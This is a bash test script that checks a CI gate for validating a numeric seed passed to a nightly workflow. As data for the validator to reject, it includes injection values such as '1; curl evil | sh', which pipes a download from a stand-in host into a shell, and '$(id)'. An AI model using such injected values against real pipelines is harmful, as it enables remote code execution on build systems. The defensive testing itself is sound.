#!/usr/bin/env bash
# order-seed.sh: the one gate a workflow_dispatch `seed` passes before any leg of
# the nightly order-independence run uses it in a shell or an emulator script.
# Run: bash scripts/ci/order-seed-test.sh
set -uo pipefail
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
. "$REPO_ROOT/scripts/shell-spec.sh"

printf '\033[36m▸\033[0m order-seed.sh\n'

# seed <args...>  -> "<printed seed> <exit status>"
seed() { local out; out="$("$REPO_ROOT/scripts/ci/order-seed.sh" "$@" 2>/dev/null)"; echo "$out $?"; }

check "a requested seed of digits is the seed" "17234567890 0" "$(seed 17234567890 42)"
check "no requested seed falls back to the run id" "42 0" "$(seed '' 42)"
check "a seed with a shell payload is refused" " 1" "$(seed '1; curl evil | sh' 42)"
check "a seed with a command substitution is refused" " 1" "$(seed '$(id)' 42)"
check "a seed with a trailing newline is refused" " 1" "$(seed $'7\n' 42)"
check "a negative seed is refused" " 1" "$(seed -5 42)"
check "a fallback that is not digits is refused too" " 1" "$(seed '' abc)"
check "a refusal says why on stderr" "1" \
  "$("$REPO_ROOT/scripts/ci/order-seed.sh" 'x' 42 2>&1 >/dev/null | grep -c 'digits')"

spec_summary
